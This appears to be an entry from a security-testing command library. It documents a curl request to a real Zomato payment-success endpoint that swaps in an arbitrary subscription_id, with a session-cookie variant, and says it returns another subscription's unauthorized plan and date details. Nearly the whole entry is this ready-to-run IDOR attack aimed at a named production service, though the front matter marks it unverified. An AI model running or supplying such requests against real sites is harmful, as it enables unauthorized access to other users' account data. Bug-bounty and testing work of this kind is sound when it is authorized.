---
id: cmd-uuid-002
data: >-
  curl -X GET
  "https://www.zomato.com/gold/payment-success?subscription_id=123456&user_id=█████████"
  -i
tags:
  - web
  - idor
  - manipulation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.662Z'
verified: false
validated: true
submitted: true
---
# curl-modify-subscription-id

## Command

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=123456&user_id=█████████" -i
```

## Description

Modifies the subscription_id to an arbitrary value to test unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `subscription_id=123456` | Altered ID value | Yes |
| `user_id=█████████` | Original user ID | Yes |
| `-i` | Show headers | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=123456&user_id=█████████" -i
```

### Advanced Usage

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=123456&user_id=█████████" -i --cookie "session=abc"
```

## Expected Output

Response with unauthorized details: start/end dates and plan.

## Related

- [[Related Procedure]]
